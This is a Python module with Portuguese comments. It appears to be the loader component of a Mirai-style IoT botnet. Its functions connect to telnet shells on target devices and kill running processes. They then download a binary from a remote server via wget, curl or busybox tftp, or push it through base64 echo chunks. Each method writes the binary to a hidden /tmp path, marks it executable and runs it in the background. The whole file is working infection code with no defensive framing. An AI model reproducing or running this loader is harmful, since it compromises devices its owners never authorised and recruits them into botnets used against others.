import socket
import time
import logging
import random
import string
import hashlib

log = logging.getLogger(__name__)


def generate_random_path() -> str:
    """Gera caminho aleatório para esconder o binário."""
    name = ''.join(random.choices(string.ascii_lowercase, k=6))
    return f'/tmp/.{name}'


def _read_until(sock, marker: bytes, timeout: float = 5.0) -> bytes:
    """Lê do socket até encontrar marker ou timeout."""
    data = b''
    sock.settimeout(timeout)
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if marker in data:
                break
    except socket.timeout:
        pass
    return data


def _send_command(sock, cmd: str, timeout: float = 3.0) -> bytes:
    """Envia comando e lê resposta."""
    sock.send(cmd.encode() + b'\n')
    time.sleep(0.5)
    return _read_until(sock, b'#', timeout)


def deploy_wget(
    host: str,
    binary_url: str,
    arch: str,
    port: int = 23,
    timeout: float = 10.0,
) -> bool:
    """
    Deploy via wget.
    1. wget -O /tmp/.XXXX http://server/bins/arm
    2. chmod +x /tmp/.XXXX
    3. /tmp/.XXXX & (executa background)
    Opcional: mata processo antigo primeiro.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        _read_until(sock, b'#', timeout=5)

        path = generate_random_path()

        # Mata proc antigo
        _send_command(sock, 'killall -9 .* 2>/dev/null; killall9 .* 2>/dev/null', timeout=2)

        # Download
        cmd = f'wget -q -O {path} {binary_url} || curl -so {path} {binary_url}'
        resp = _send_command(sock, cmd, timeout=timeout)
        log.debug(f"wget response from {host}: {resp[:100]}")

        # Verifica se baixou
        check = _send_command(sock, f'ls -la {path}', timeout=2)
        if b'No such file' in check or b'cannot access' in check:
            log.warning(f"Download falhou em {host}")
            sock.close()
            return False

        # Chmod + executa
        _send_command(sock, f'chmod +x {path}', timeout=2)
        _send_command(sock, f'{path} 2>/dev/null &', timeout=2)

        sock.close()
        log.info(f"Deploy wget bem-sucedido em {host} ({arch}) -> {path}")
        return True

    except Exception as e:
        log.debug(f"Erro deploy wget em {host}: {e}")
        return False


def deploy_tftp(
    host: str,
    tftp_server: str,
    binary_name: str,
    arch: str,
    port: int = 23,
    timeout: float = 15.0,
) -> bool:
    """
    Deploy via TFTP.
    Dispositivos IoT antigos geralmente têm TFTP cliente.
    tftp -g -r <bin> -l <path> <server>
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        _read_until(sock, b'#', timeout=5)

        path = generate_random_path()

        # TFTP: tftp -g (get) -r (remote file) -l (local file)
        # Variações: busybox tftp, tftp padrão
        cmd = f'tftp -g -r {binary_name} -l {path} {tftp_server}'
        resp = _send_command(sock, cmd, timeout=timeout)
        log.debug(f"tftp response from {host}: {resp[:100]}")

        # Alternativa busybox
        if b'not found' in resp or b'illegal' in resp:
            cmd = f'busybox tftp -g -r {binary_name} -l {path} {tftp_server}'
            resp = _send_command(sock, cmd, timeout=timeout)

        check = _send_command(sock, f'ls -la {path}', timeout=2)
        if b'No such file' in check or b'cannot access' in check:
            log.warning(f"TFTP falhou em {host}")
            sock.close()
            return False

        _send_command(sock, f'chmod +x {path}', timeout=2)
        _send_command(sock, f'{path} 2>/dev/null &', timeout=2)

        sock.close()
        log.info(f"Deploy tftp bem-sucedido em {host} ({arch}) -> {path}")
        return True

    except Exception as e:
        log.debug(f"Erro deploy tftp em {host}: {e}")
        return False


def deploy_echo(
    host: str,
    binary_b64: str,
    arch: str,
    port: int = 23,
    timeout: float = 60.0,
) -> bool:
    """
    Deploy via echo + base64 (echoload).
    Útil quando wget/tftp não estão disponíveis.
    O binário é codificado em base64 e enviado linha por linha.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        _read_until(sock, b'#', timeout=5)

        path = generate_random_path()

        # Decodifica em etapas para evitar sobrecarga do shell
        chunk_size = 500  # caracteres por echo
        total_chunks = (len(binary_b64) + chunk_size - 1) // chunk_size

        # Prepara comando: echo base64 | base64 -d > path
        # Alguns dispositivos têm base64, outros busybox base64 -d
        # E alguns têm apenas openssl enc -base64 -d

        # Escreve base64 em pedaços
        for i in range(0, len(binary_b64), chunk_size):
            chunk = binary_b64[i:i + chunk_size]
            cmd = f'echo -n "{chunk}" >> {path}.b64'
            _send_command(sock, cmd, timeout=1)
            # Progresso silencioso
            if i % (chunk_size * 50) == 0 and i > 0:
                log.debug(f"Echoload {host}: {100 * i // len(binary_b64)}%")

        # Decodifica
        # Tenta diferentes métodos de decodificação
        dec_cmds = [
            f'base64 -d < {path}.b64 > {path}',
            f'busybox base64 -d < {path}.b64 > {path}',
            f'openssl enc -base64 -d < {path}.b64 > {path}',
            f'cat {path}.b64 | base64 -d > {path}',
            f'cat {path}.b64 | busybox base64 -d > {path}',
        ]

        decoded = False
        for dec_cmd in dec_cmds:
            resp = _send_command(sock, dec_cmd, timeout=5)
            if b'not found' not in resp and b'illegal' not in resp:
                decoded = True
                break

        if not decoded:
            log.warning(f"Echoload: nenhum decodificador funcionou em {host}")
            sock.close()
            return False

        # Limpa base64
        _send_command(sock, f'rm {path}.b64', timeout=1)

        # Verifica
        check = _send_command(sock, f'ls -la {path}', timeout=2)
        if b'No such file' in check:
            log.warning(f"Echoload: arquivo não encontrado após decodificar {host}")
            sock.close()
            return False

        _send_command(sock, f'chmod +x {path}', timeout=2)
        _send_command(sock, f'{path} 2>/dev/null &', timeout=2)

        sock.close()
        log.info(f"Deploy echo bem-sucedido em {host} ({arch}) -> {path}")
        return True

    except Exception as e:
        log.debug(f"Erro deploy echo em {host}: {e}")
        return False


def deploy_curl(
    host: str,
    binary_url: str,
    arch: str,
    port: int = 23,
    timeout: float = 10.0,
) -> bool:
    """Deploy via curl (alternativa ao wget)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        _read_until(sock, b'#', timeout=5)

        path = generate_random_path()

        cmd = f'curl -so {path} {binary_url} || wget -q -O {path} {binary_url}'
        resp = _send_command(sock, cmd, timeout=timeout)
        log.debug(f"curl response from {host}: {resp[:100]}")

        check = _send_command(sock, f'ls -la {path}', timeout=2)
        if b'No such file' in check:
            log.warning(f"curl/wget falhou em {host}")
            sock.close()
            return False

        _send_command(sock, f'chmod +x {path}', timeout=2)
        _send_command(sock, f'{path} 2>/dev/null &', timeout=2)

        sock.close()
        log.info(f"Deploy curl bem-sucedido em {host} ({arch}) -> {path}")
        return True

    except Exception as e:
        log.debug(f"Erro deploy curl em {host}: {e}")
        return False


def deploy_alternatives(
    host: str,
    binary_url: str,
    tftp_server: str,
    tftp_binary_name: str,
    binary_b64: str,
    arch: str,
    port: int = 23,
) -> bool:
    """
    Tenta múltiplos métodos de deploy em ordem:
    1. wget (mais comum)
    2. curl (alternativa HTTP)
    3. tftp (IoT antigo)
    4. echo (fallback universal)
    """
    methods = [
        ("wget", lambda: deploy_wget(host, binary_url, arch, port)),
        ("curl", lambda: deploy_curl(host, binary_url, arch, port)),
        ("tftp", lambda: deploy_tftp(host, tftp_server, tftp_binary_name, arch, port)),
        ("echo", lambda: deploy_echo(host, binary_b64, arch, port)),
    ]

    for name, method in methods:
        log.info(f"Tentando deploy via {name} em {host}")
        try:
            if method():
                log.info(f"Deploy bem-sucedido via {name} em {host}")
                return True
        except Exception as e:
            log.debug(f"Método {name} falhou em {host}: {e}")

    log.warning(f"Todos os métodos de deploy falharam em {host}")
    return False
